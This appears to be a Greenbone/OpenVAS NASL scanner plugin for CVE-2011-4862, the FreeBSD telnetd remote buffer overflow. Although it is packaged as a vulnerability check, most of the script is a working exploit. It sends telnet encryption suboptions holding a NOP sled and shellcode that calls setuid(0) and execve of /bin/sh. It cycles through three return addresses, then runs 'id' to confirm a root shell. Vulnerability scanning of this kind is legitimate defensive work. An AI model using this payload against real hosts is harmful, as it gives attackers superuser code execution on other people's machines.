if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103373" );
	script_bugtraq_id( 51182 );
	script_cve_id( "CVE-2011-4862" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_name( "FreeBSD 'telnetd' Daemon Remote Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51182" );
	script_xref( name: "URL", value: "http://www.freebsd.org/" );
	script_xref( name: "URL", value: "http://security.freebsd.org/advisories/FreeBSD-SA-11:08.telnetd.asc" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-12-28 12:32:36 +0100 (Wed, 28 Dec 2011)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Buffer overflow" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "telnetserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/telnet", 23 );
	script_mandatory_keys( "telnet/banner/available" );
	script_tag( name: "solution", value: "Updates are available to address this issue. Please see the references
  for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "FreeBSD is prone to a remote buffer-overflow vulnerability." );
	script_tag( name: "impact", value: "Exploiting this issue allows remote attackers to execute arbitrary
  code with superuser privileges. Successfully exploiting this issue
  will completely compromise affected computers." );
	exit( 0 );
}
require("telnet_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("dump.inc.sc");
port = telnet_get_port( default: 23 );
banner = telnet_get_banner( port: port );
if(!banner || !ContainsString( banner, "FreeBSD" )){
	exit( 0 );
}
fbsd[0] = raw_string( 0xed, 0xee );
fbsd[1] = raw_string( 0xa6, 0xee );
fbsd[2] = raw_string( 0x86, 0xde );
for bsd in fbsd {
	soc = open_sock_tcp( port );
	if(!soc){
		continue;
	}
	recv = recv( socket: soc, length: 256 );
	req = raw_string( 0xff, 0xfa, 0x26, 0x00, 0x01, 0x01, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0xff, 0xf0, 0x00 );
	send( socket: soc, data: req );
	recv = recv( socket: soc, length: 8192 );
	if(!recv || strlen( recv ) < 8 || !IsMatchRegexp( hexstr( recv ), "fffa260201" )){
		close( soc );
		exit( 0 );
	}
	req = raw_string( 0xff, 0xfa, 0x26, 0x07, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x31, 0xc0, 0x50, 0xb0, 0x17, 0x50, 0xcd, 0x80, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x2f, 0x62, 0x69, 0x89, 0xe3, 0x50, 0x54, 0x53, 0x50, 0xb0, 0x3b, 0xcd, 0x80, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x44, 0x45, 0x41, 0x44, 0x42, 0x45, 0x45, 0x46, 0x6c, 0x6f, 0x05, 0x08 );
	req += bsd;
	req += raw_string( 0x05, 0x08, 0xff, 0xf0, 0x00 );
	send( socket: soc, data: req );
	recv = recv( socket: soc, length: 8192 );
	if(!recv || strlen( recv ) < 6){
		close( soc );
		continue;
	}
	send( socket: soc, data: req );
	send( socket: soc, data: raw_string( 0x69, 0x64, 0x0a ) );
	recv = recv( socket: soc, length: 8192 );
	close( soc );
	if(IsMatchRegexp( recv, "uid=[0-9]+.*gid=[0-9]+" )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

